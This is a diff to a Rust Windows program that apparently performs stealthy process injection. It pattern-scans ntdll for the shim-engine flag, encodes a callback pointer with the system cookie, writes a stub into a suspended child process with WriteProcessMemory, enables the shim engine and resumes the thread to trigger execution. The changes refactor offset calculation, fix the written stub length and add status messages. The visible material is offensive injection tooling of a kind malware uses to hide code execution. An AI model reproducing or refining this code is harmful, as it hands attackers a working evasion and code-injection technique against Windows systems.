@@ -1,11 +1,8 @@
 #![allow(non_upper_case_globals)]
-use std::{
-    ffi::CString, intrinsics::copy_nonoverlapping, mem::zeroed, ops::Add, os::raw::c_void,
-    ptr::null_mut,
-};
+use std::{ffi::CString, mem::zeroed, ops::Add, os::raw::c_void, ptr::null_mut};
 
 use windows_sys::Win32::{
-    Foundation::{CloseHandle, HCN_E_NETWORK_NOT_FOUND},
+    Foundation::CloseHandle,
     System::{
         Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER, WriteProcessMemory},
         LibraryLoader::{GetModuleHandleA, GetProcAddress},
@@ -101,22 +98,6 @@ fn encode_system_ptr(ptr: *mut c_void) -> *mut c_void {
         let encoded = rotr64(cookie as u64 ^ ptr as u64, (cookie & 0x3F) as u64);
         encoded as *mut c_void
     }
-}
-
-fn find_offset(base: *const u8, size: usize, pattern: &[u8]) -> usize {
-    for i in 0..(size - pattern.len()) {
-        let mut found = true;
-        for j in 0..pattern.len() {
-            if unsafe { *base.add(i + j) != pattern[j] } {
-                found = false;
-                break;
-            }
-        }
-        if found {
-            return i;
-        }
-    }
-    0
 }
 
 fn find_pattern(buffer: &[u8], pattern: &[u8]) -> Option<usize> {
@@ -275,13 +256,14 @@ unsafe fn find_shims_enabled_address(
             ) {
                 let found_ptr = current_ptr + offset;
 
-                if *(found_ptr as *const u8).add(pattern.size as usize + 3) == 0x00 {
-                    let rel_offset_ptr = found_ptr + pattern.size as usize;
-                    let rel_offset = std::ptr::read_unaligned(rel_offset_ptr as *const i32);
+                let offset_ptr = found_ptr + pattern.size as usize;
 
-                    let result_ptr = (found_ptr as isize
-                        + pattern.pc_offset as isize
-                        + rel_offset as isize) as usize;
+                if *(offset_ptr as *const u8).add(3) == 0x00 {
+                    let rel_offset = std::ptr::read_unaligned(offset_ptr as *const i32);
+
+                    let result_ptr = (rel_offset as isize
+                        + offset_ptr as isize
+                        + pattern.pc_offset as isize) as usize;
 
                     let data_start = (h_ntdll as usize) + (*data_section).VirtualAddress as usize;
                     let data_end = data_start + (*data_section).Misc.VirtualSize as usize;
@@ -450,7 +432,7 @@ fn main() {
             pi.hProcess,
             remote_buffer,
             patched_stub.as_ptr() as *const c_void,
-            STUB.len(),
+            patched_stub.len(),
             &mut bytes_written,
         ) == 0
         {
@@ -477,7 +459,7 @@ fn main() {
             return;
         }
 
-        let g_value = true;
+        let g_value = 1;
 
         if WriteProcessMemory(
             pi.hProcess,
@@ -490,6 +472,8 @@ fn main() {
             println!("[-] Failed to write remote process");
             TerminateProcess(pi.hProcess, 0);
         }
+
+        println!("[+] Shim engine enabled");
 
         let g_value = encode_system_ptr(remote_buffer);
 
@@ -504,6 +488,8 @@ fn main() {
             println!("[-] Failed to write to remote process");
             TerminateProcess(pi.hProcess, 0);
         }
+
+        println!("[*] Triggering the callback");
 
         ResumeThread(pi.hThread);
 
